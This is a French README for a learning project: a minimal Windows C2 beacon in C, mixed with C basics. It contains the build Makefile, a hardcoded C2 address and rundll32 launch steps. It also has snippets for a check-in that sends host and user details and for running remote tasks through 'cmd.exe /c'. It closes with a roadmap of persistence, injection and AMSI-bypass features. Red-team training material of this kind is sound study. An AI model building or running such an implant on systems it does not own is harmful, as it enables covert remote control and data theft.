# Beacon C2 - Guide d'apprentissage

Un beacon minimaliste en C pour apprendre le développement offensif et le langage C.

## Table des matières

1. [Vue d'ensemble](#vue-densemble)
2. [Prérequis](#prérequis)
3. [Compilation](#compilation)
4. [Utilisation](#utilisation)
5. [Le Makefile expliqué](#le-makefile-expliqué)
6. [Bases du C](#bases-du-c)
7. [Architecture du code](#architecture-du-code)
8. [Fichiers détaillés](#fichiers-détaillés)
9. [Debugging](#debugging)
10. [Pour aller plus loin](#pour-aller-plus-loin)

---

## Vue d'ensemble

### C'est quoi un beacon ?

Un beacon est un implant qui s'exécute sur une machine cible et communique périodiquement avec un serveur C2 (Command & Control). Le cycle de vie :

```
┌─────────────────────────────────────────────────────────┐
│                     BEACON                               │
│                                                          │
│  1. Check-in ──────────────────────────────► C2 Server  │
│     (envoie: hostname, username, IP, OS)                │
│                                                          │
│  2. Sleep (5 secondes)                                  │
│                                                          │
│  3. Poll for tasks ────────────────────────► C2 Server  │
│     GET /api/v1/tasks/{agent_id}                        │
│                                                          │
│  4. Si tâche reçue:                                     │
│     - Exécute la commande (cmd.exe /c ...)              │
│     - Envoie le résultat ──────────────────► C2 Server  │
│                                                          │
│  5. Retourne à l'étape 2 (boucle infinie)               │
└─────────────────────────────────────────────────────────┘
```

### Pourquoi en C ?

- **Léger** : Pas de runtime (.NET, Python, etc.)
- **Contrôle total** : Accès direct aux API Windows
- **Standard de l'industrie** : Cobalt Strike, Havoc, Sliver utilisent C
- **Convertible en shellcode** : Plus facile qu'avec d'autres langages

---

## Prérequis

### Sur Mac (cross-compilation)

```bash
# Installe le compilateur Windows
brew install mingw-w64
```

### Sur Linux

```bash
sudo apt install mingw-w64
```

### Sur Windows

Installe [MSYS2](https://www.msys2.org/) ou Visual Studio avec les outils C++.

---

## Compilation

```bash
# Clone/télécharge le projet
cd beacon

# Version debug (avec prints) - DLL
make debug

# Version debug - EXE (pour tester avec une console)
make test-exe

# Version release (sans debug)
make

# Nettoyer
make clean
```

### Modifier la configuration

Édite `src/types.h` :

```c
#define SERVER_IP       "192.168.1.24"  // IP de ton serveur C2
#define SERVER_PORT     8000            // Port du serveur
#define SLEEP_TIME_MS   5000            // Intervalle de polling (ms)
```

---

## Utilisation

### Lancer le beacon (DLL)

```cmd
rundll32.exe beacon_debug.dll, Start
```

> **Note** : L'espace après la virgule est important !

### Lancer le beacon (EXE de test)

```cmd
beacon_test.exe
```

L'EXE affiche les logs dans la console, pratique pour debug.

---

## Le Makefile expliqué

Un Makefile automatise la compilation. Voici le nôtre décortiqué :

```makefile
# ═══════════════════════════════════════════════════════════════
# VARIABLES
# ═══════════════════════════════════════════════════════════════

# Le compilateur : mingw pour cross-compiler vers Windows
CC = x86_64-w64-mingw32-gcc

# Flags de compilation :
#   -Wall     : Active tous les warnings courants
#   -Wextra   : Warnings supplémentaires
#   -O2       : Optimisation niveau 2 (code plus rapide)
CFLAGS = -Wall -Wextra -O2

# Bibliothèques Windows à lier :
#   -lwinhttp : Pour les requêtes HTTP (WinHTTP)
#   -lws2_32  : Pour les sockets (Winsock2) - utilisé pour get_internal_ip
#   -lole32   : Pour COM/OLE (CoCreateGuid)
LIBS = -lwinhttp -lws2_32 -lole32

# Répertoire des sources
SRC_DIR = src

# Liste des fichiers source
SOURCES = $(SRC_DIR)/main.c \
          $(SRC_DIR)/sysinfo.c \
          $(SRC_DIR)/json.c \
          $(SRC_DIR)/http.c \
          $(SRC_DIR)/commands.c

# Noms des fichiers de sortie
OUTPUT = beacon.dll
OUTPUT_DEBUG = beacon_debug.dll

# ═══════════════════════════════════════════════════════════════
# CIBLES (TARGETS)
# ═══════════════════════════════════════════════════════════════

# Cible par défaut (quand tu tapes juste "make")
all: $(OUTPUT)

# Compile la DLL release
# -shared : Crée une DLL (pas un EXE)
$(OUTPUT): $(SOURCES)
	$(CC) $(CFLAGS) -shared -o $@ $^ $(LIBS)
	@echo "✅ Compilation réussie: $(OUTPUT)"

# Cible debug : ajoute -DDEBUG et -g aux flags
# -DDEBUG : Définit la macro DEBUG (active les prints)
# -g      : Inclut les symboles de debug
debug: CFLAGS += -DDEBUG -g
debug: $(SOURCES)
	$(CC) $(CFLAGS) -shared -o $(OUTPUT_DEBUG) $^ $(LIBS)
	@echo "✅ Compilation debug réussie: $(OUTPUT_DEBUG)"

# Cible test-exe : compile un EXE avec console
# -mconsole : Crée une application console (pas GUI)
test-exe: CFLAGS += -DDEBUG -g
test-exe: $(SOURCES)
	$(CC) $(CFLAGS) -o beacon_test.exe $^ $(LIBS) -mconsole
	@echo "✅ Test exe compilé: beacon_test.exe"

# Nettoie les fichiers compilés
clean:
	rm -f $(OUTPUT) $(OUTPUT_DEBUG) beacon_test.exe

# Déclare les cibles "phony" (pas des fichiers)
.PHONY: all debug test-exe clean
```

### Variables automatiques du Makefile

| Variable | Signification | Exemple |
|----------|---------------|---------|
| `$@` | La cible (target) | `beacon.dll` |
| `$^` | Toutes les dépendances | `src/main.c src/sysinfo.c ...` |
| `$<` | La première dépendance | `src/main.c` |

### Commandes

```bash
make            # Compile beacon.dll (release)
make debug      # Compile beacon_debug.dll (avec prints)
make test-exe   # Compile beacon_test.exe (console)
make clean      # Supprime les fichiers compilés
```

---

## Bases du C

### Headers (.h) vs Sources (.c)

```
┌─────────────────┐      ┌─────────────────┐
│   sysinfo.h     │      │   sysinfo.c     │
│   (déclarations)│      │   (implémentation)│
├─────────────────┤      ├─────────────────┤
│ // Prototype    │      │ // Code réel    │
│ int get_info(); │ ◄──► │ int get_info() {│
│                 │      │   return 42;    │
│                 │      │ }               │
└─────────────────┘      └─────────────────┘
```

- **Header (.h)** : Déclarations, prototypes, structures. Dit "ces fonctions existent".
- **Source (.c)** : Implémentation. Contient le code réel.

Pourquoi séparer ? Pour éviter les définitions multiples quand plusieurs fichiers utilisent les mêmes fonctions.

### #include et les guards

```c
// types.h
#ifndef TYPES_H        // Si TYPES_H n'est pas défini...
#define TYPES_H        // ...le définir

// Contenu du header ici

#endif                 // Fin du bloc conditionnel
```

Ces "include guards" empêchent d'inclure le même header 2 fois (ce qui causerait des erreurs de redéfinition).

### Pointeurs

Un pointeur stocke une **adresse mémoire**, pas une valeur.

```c
int x = 42;           // x contient 42
int* ptr = &x;        // ptr contient l'ADRESSE de x

printf("%d\n", x);    // Affiche: 42
printf("%p\n", ptr);  // Affiche: 0x7fff5a2b3c4d (l'adresse)
printf("%d\n", *ptr); // Affiche: 42 (déréférencement)

*ptr = 100;           // Modifie x via son adresse
printf("%d\n", x);    // Affiche: 100
```

**Opérateurs** :
- `&x` : "Adresse de x"
- `*ptr` : "Valeur à l'adresse ptr" (déréférencement)

### Structures (struct)

Regroupe plusieurs variables :

```c
// Définition
typedef struct {
    char name[64];
    int age;
    float salary;
} Employee;

// Utilisation
Employee emp;
strcpy(emp.name, "Alice");
emp.age = 30;
emp.salary = 50000.0;

// Avec pointeur
Employee* ptr = &emp;
ptr->age = 31;              // Équivalent à (*ptr).age = 31
printf("%s\n", ptr->name);  // Affiche: Alice
```

**Notation** :
- `emp.age` : Accès direct au membre
- `ptr->age` : Accès via pointeur (raccourci pour `(*ptr).age`)

### Tableaux et chaînes

```c
// Tableau de caractères (chaîne C)
char name[64];                    // Buffer de 64 octets
strcpy(name, "Hello");            // Copie "Hello\0" dedans
printf("%s\n", name);             // Affiche: Hello

// ⚠️ Les chaînes C finissent TOUJOURS par '\0' (null byte)
// "Hello" = {'H', 'e', 'l', 'l', 'o', '\0'}

// Taille
strlen(name);                     // Retourne 5 (sans le \0)
sizeof(name);                     // Retourne 64 (taille du buffer)
```

### Allocation mémoire

```c
// Stack (automatique) - libéré à la fin de la fonction
char buffer[1024];

// Heap (dynamique) - doit être libéré manuellement
char* data = (char*)malloc(1024);
if (data == NULL) {
    // Erreur d'allocation
}
// ... utilisation ...
free(data);  // IMPORTANT : libérer la mémoire !
```

Dans notre beacon, on utilise principalement la stack pour éviter les fuites mémoire.

### Macros préprocesseur

```c
// Constantes
#define SERVER_PORT 8000

// Macros fonctions
#define MAX(a, b) ((a) > (b) ? (a) : (b))

// Compilation conditionnelle
#ifdef DEBUG
    printf("Mode debug\n");
#endif

// Notre macro DEBUG_PRINT
#ifdef DEBUG
#define DEBUG_PRINT(fmt, ...) printf("[BEACON] " fmt "\n", ##__VA_ARGS__)
#else
#define DEBUG_PRINT(fmt, ...)  // Ne fait rien en release
#endif
```

Le préprocesseur remplace ces macros AVANT la compilation.

---

## Architecture du code

```
beacon/
├── Makefile              # Script de compilation
├── README.md             # Ce fichier
└── src/
    ├── types.h           # Structures et configuration
    ├── sysinfo.h/.c      # Infos système (hostname, IP, etc.)
    ├── json.h/.c         # Construction/parsing JSON
    ├── http.h/.c         # Communication HTTP (WinHTTP)
    ├── commands.h/.c     # Exécution de commandes
    └── main.c            # Point d'entrée, boucle principale
```

### Flux de données

```
main.c
   │
   ├── sysinfo.c ──► Collecte hostname, username, IP, OS
   │                      │
   │                      ▼
   ├── json.c ─────► Convertit en JSON
   │                      │
   │                      ▼
   ├── http.c ─────► Envoie au serveur (POST /checkin)
   │
   │  [BOUCLE]
   │     │
   │     ├── http.c ──► Poll tasks (GET /tasks/{id})
   │     │
   │     ├── json.c ──► Parse la réponse
   │     │
   │     ├── commands.c ► Exécute la commande
   │     │
   │     └── http.c ──► Envoie le résultat (POST /result)
   │
   └── [REPEAT]
```

---

## Fichiers détaillés

### types.h - Configuration et structures

```c
// Configuration du beacon
#define SERVER_IP       "192.168.1.24"   // Où envoyer les requêtes
#define SERVER_PORT     8000             // Port du serveur
#define SLEEP_TIME_MS   5000             // Pause entre chaque poll

// Tailles des buffers (évite les magic numbers)
#define UUID_SIZE       64
#define SMALL_BUF       128
#define MEDIUM_BUF      1024
#define LARGE_BUF       8192

// Structure pour les infos de l'agent
typedef struct {
    char agent_id[UUID_SIZE];      // UUID unique
    char username[SMALL_BUF];      // Ex: "Administrator"
    char hostname[SMALL_BUF];      // Ex: "DESKTOP-ABC123"
    char internal_ip[16];          // Ex: "192.168.1.50"
    char os_version[SMALL_BUF];    // Ex: "Windows 10.0.19045"
} AgentInfo;
```

### sysinfo.c - Collecte d'informations système

Utilise les API Windows pour récupérer les infos :

| Fonction | API Windows | Description |
|----------|-------------|-------------|
| `generate_uuid()` | `CoCreateGuid()` | Génère un identifiant unique |
| `get_hostname()` | `GetComputerNameA()` | Nom de la machine |
| `get_username()` | `GetUserNameA()` | Utilisateur courant |
| `get_internal_ip()` | `gethostbyname()` | IP locale |
| `get_os_version()` | `RtlGetVersion()` | Version Windows |

**Note sur RtlGetVersion** : On utilise cette fonction de `ntdll.dll` au lieu de `GetVersionEx()` (deprecated) car elle ne ment pas sur la version de Windows.

```c
// Chargement dynamique d'une fonction de ntdll.dll
HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
RtlGetVersionPtr pRtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
pRtlGetVersion(&osvi);  // Appel via pointeur de fonction
```

### json.c - Sérialisation JSON à la main

Pas de bibliothèque externe ! On construit le JSON avec `snprintf()` :

```c
// Construction
snprintf(output, size,
    "{"
    "\"agent_id\":\"%s\","
    "\"hostname\":\"%s\""
    "}",
    info->agent_id,
    info->hostname
);

// Parsing (basique, avec strstr)
const char* pos = strstr(json, "\"command\":");
// ... extraction manuelle
```

**Pourquoi à la main ?**
- Pas de dépendance externe
- DLL plus légère
- Contrôle total

### http.c - Communication avec WinHTTP

WinHTTP est l'API Windows pour faire des requêtes HTTP :

```c
// Flux WinHTTP
HINTERNET hSession = WinHttpOpen(...);           // 1. Ouvre une session
HINTERNET hConnect = WinHttpConnect(...);        // 2. Connecte au serveur
HINTERNET hRequest = WinHttpOpenRequest(...);    // 3. Prépare la requête
WinHttpSendRequest(hRequest, ...);               // 4. Envoie
WinHttpReceiveResponse(hRequest, ...);           // 5. Reçoit la réponse
WinHttpReadData(hRequest, buffer, ...);          // 6. Lit les données
WinHttpCloseHandle(...);                         // 7. Ferme les handles
```

**Handles** : En Windows, un "handle" est une référence opaque à une ressource système. Toujours les fermer avec `CloseHandle()` ou équivalent !

### commands.c - Exécution de commandes

Utilise des pipes pour capturer stdout/stderr :

```
┌──────────────┐    pipe    ┌──────────────┐
│   beacon     │◄───────────│   cmd.exe    │
│              │  (stdout)  │  /c whoami   │
└──────────────┘            └──────────────┘
```

```c
// Crée un pipe (tuyau) pour capturer la sortie
CreatePipe(&hReadPipe, &hWritePipe, &sa, 0);

// Configure le process pour écrire dans le pipe
si.hStdOutput = hWritePipe;
si.hStdError = hWritePipe;

// Lance cmd.exe
CreateProcessA(NULL, "cmd.exe /c whoami", ...);

// Ferme le côté écriture (IMPORTANT sinon ReadFile bloque)
CloseHandle(hWritePipe);

// Lit la sortie
ReadFile(hReadPipe, buffer, ...);
```

### main.c - Point d'entrée

Deux points d'entrée selon le contexte :

```c
// Pour rundll32.exe beacon.dll,Start
__declspec(dllexport) void CALLBACK Start(...) {
    // Crée un thread pour ne pas bloquer rundll32
    CreateThread(..., BeaconMain, ...);
    WaitForSingleObject(...);  // Attend que le thread finisse
}

// Pour le test EXE
#ifdef DEBUG
int main(void) {
    BeaconMain();
    return 0;
}
#endif

// DllMain : appelé au chargement/déchargement de la DLL
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, ...) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            // DLL vient d'être chargée
            break;
        case DLL_PROCESS_DETACH:
            // DLL va être déchargée
            break;
    }
    return TRUE;
}
```

---

## Debugging

### Méthode 1 : EXE de test (recommandé pour commencer)

```bash
make test-exe
```

```cmd
beacon_test.exe
```

Tu vois tous les prints dans la console.

### Méthode 2 : DebugView (pour la DLL)

1. Télécharge [DebugView](https://learn.microsoft.com/en-us/sysinternals/downloads/debugview)
2. Lance-le en **administrateur**
3. Active **Capture → Capture Global Win32**
4. Lance ta DLL

Pour utiliser DebugView, modifie la macro DEBUG_PRINT dans main.c :

```c
#ifdef DEBUG
#define DEBUG_PRINT(fmt, ...) do { \
    char _dbg_buf[512]; \
    snprintf(_dbg_buf, sizeof(_dbg_buf), "[BEACON] " fmt "\n", ##__VA_ARGS__); \
    OutputDebugStringA(_dbg_buf); \
} while(0)
#else
#define DEBUG_PRINT(fmt, ...)
#endif
```

### Méthode 3 : x64dbg (debugger)

1. Ouvre x64dbg
2. File → Open → `rundll32.exe`
3. Dans la command line, ajoute : `beacon_debug.dll, Start`
4. Met des breakpoints et step through

### Erreurs courantes

| Erreur | Cause probable | Solution |
|--------|----------------|----------|
| Check-in failed | Mauvaise IP/port, firewall | Vérifie `types.h`, teste avec curl |
| DLL meurt immédiatement | Crash dans le code | Compile en EXE et debug |
| Pas de résultat de commande | Timeout ou erreur pipe | Augmente `COMMAND_TIMEOUT_MS` |
| "Access denied" au delete | DLL encore chargée | `taskkill /F /IM rundll32.exe` |

---

## Pour aller plus loin

### Améliorations possibles

1. **Chiffrement** : AES pour les communications
2. **Jitter** : Randomiser le sleep (anti-détection)
3. **Injection** : Injecter dans un autre process
4. **Persistence** : Registry, scheduled tasks
5. **Plus de commandes** : Upload, download, screenshot
6. **HTTPS** : Chiffrer le transport

### Ressources pour apprendre

**C en général :**
- [Beej's Guide to C Programming](https://beej.us/guide/bgc/)
- "The C Programming Language" (K&R)

**Windows API :**
- [Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/)
- [Windows Internals](https://docs.microsoft.com/en-us/sysinternals/)

**Développement offensif :**
- [MalDev Academy](https://maldevacademy.com/)
- [Red Team Notes](https://www.ired.team/)
- [Sektor7 Courses](https://institute.sektor7.net/)

### Structure d'un "vrai" beacon

```
beacon/
├── core/
│   ├── beacon.c          # Boucle principale
│   ├── config.c          # Configuration chiffrée
│   └── crypto.c          # AES, RC4, etc.
├── comms/
│   ├── http.c            # HTTP/HTTPS
│   ├── dns.c             # DNS tunneling
│   └── smb.c             # Named pipes
├── commands/
│   ├── shell.c           # Exécution commandes
│   ├── file.c            # Upload/download
│   ├── process.c         # Process injection
│   └── token.c           # Token manipulation
├── evasion/
│   ├── unhook.c          # Unhook NTDLL
│   ├── syscalls.c        # Direct syscalls
│   └── amsi.c            # AMSI bypass
└── loader/
    ├── reflective.c      # Reflective loading
    └── shellcode.c       # Shellcode conversion
```

---

## License

Ce code est fourni à des fins éducatives uniquement. Utilise-le de manière responsable et légale, uniquement sur des systèmes que tu es autorisé à tester.

---

*Happy hacking! 🎯*